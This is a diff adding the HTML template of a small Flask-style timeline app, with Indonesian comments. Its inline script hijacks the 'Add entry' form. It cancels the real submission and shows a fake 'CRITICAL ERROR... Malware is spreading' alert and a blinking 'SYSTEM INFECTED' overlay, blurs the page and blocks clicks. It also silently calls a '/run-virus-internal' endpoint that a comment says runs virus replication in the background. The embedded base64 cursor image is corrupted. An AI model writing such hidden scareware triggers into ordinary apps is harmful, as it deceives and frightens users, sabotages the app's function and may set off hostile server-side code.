@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Timeline App</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="{{ url_for('static', filename='css/styles.css') }}" rel="stylesheet">
+    
+    <style>
+        /* Mendefinisikan class custom kursor virus */
+        .virus-cursor {
+            /* PENTING: Pake gambar Base64 (Emoticon Tengkorak Merah 💀) sebagai kursor custom */
+            cursor: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgdmlld0JveD0iMCAwIDEyOCAxMjgiPgogIDx0ZXh0IHk9IjEuMmVtIiBmb250LXNpemU9IjkwIj7wn5 skullsPC90ZXh0Pgo8L3N2Zz4='), not-allowed !important;
+            
+            /* Mematikan semua interaksi klik */
+            pointer-events: none !important;
+        }
+
+        /* 2. TULISAN MENEGANGKAN DI TENGAH */
+        #virus-text {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            font-size: 4rem;
+            text-align: center;
+            text-shadow: 0 0 15px #000;
+            animation: blinker 0.4s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0; }
+        }
+
+        /* 3. TRANSISI HALUS UNTUK BLUR */
+        body {
+            transition: filter 0.3s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <!-- OVERLAY DAN TULISAN VIRUS -->
+    <div id="virus-overlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; background: rgba(0, 0, 0, 0.4);"></div>
+    <div id="virus-text">SYSTEM INFECTED<br>💀💀💀</div>
+
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary mb-4">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="/">TimelineApp</a>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <span class="navbar-text text-white">Welcome, {{ user }}</span>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/logout">Logout</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="row mb-4">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-body">
+                        <form action="/create" method="post" class="d-flex">
+                            <input name="content" class="form-control me-2" placeholder="Add new entry..." required>
+                            <button type="submit" class="btn btn-success">Add</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-body">
+                        <form action="/search" method="get" class="input-group">
+                            <input name="keyword" class="form-control" placeholder="Search...">
+                            <button class="btn btn-outline-secondary" type="submit">Go</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header bg-light">
+                <h5 class="mb-0">Timeline</h5>
+            </div>
+            <ul class="list-group list-group-flush">
+                {% for line in tl %}
+                <li class="list-group-item d-flex justify-content-between align-items-center">
+                    <div>{{ line.content }}</div>
+                    <a href="/delete/{{ line.id }}" class="btn btn-sm btn-danger">Delete</a>
+                </li>
+                {% else %}
+                <li class="list-group-item text-center text-muted">No entries yet.</li>
+                {% endfor %}
+            </ul>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+    const addForm = document.querySelector('form[action="/create"]');
+    
+    addForm.onsubmit = function(e) {
+        e.preventDefault(); 
+
+        // 1. Munculkan Alert Awal
+        alert("⚠️ CRITICAL ERROR ⚠️\n\nUnauthorized access detected.\nMalware is spreading through Teknologi Informasi UMY network...");
+
+        // 2. AKTIFKAN EFEK VIRUS
+        const overlay = document.getElementById('virus-overlay');
+        const vText = document.getElementById('virus-text');
+        
+        overlay.style.display = 'block';
+        vText.style.display = 'block'; // Munculkan tulisan kedip-kedip
+        
+        // Kasih efek Blur dan Kursor Tengkorak
+        document.body.classList.add('virus-cursor');
+        document.body.style.filter = "blur(10px) grayscale(100%)"; 
+
+        // 3. Jalankan replikasi virus di Python (background)
+        fetch('/run-virus-internal'); 
+
+        // 4. Durasi 5 detik sebelum kembali normal
+        setTimeout(function() {
+            overlay.style.display = 'none';
+            vText.style.display = 'none';
+            document.body.classList.remove('virus-cursor');
+            document.body.style.filter = "none";
+            
+            addForm.querySelector('input[name="content"]').value = "";
+        }, 5000); 
+    };
+    </script>
+</body>
+</html>
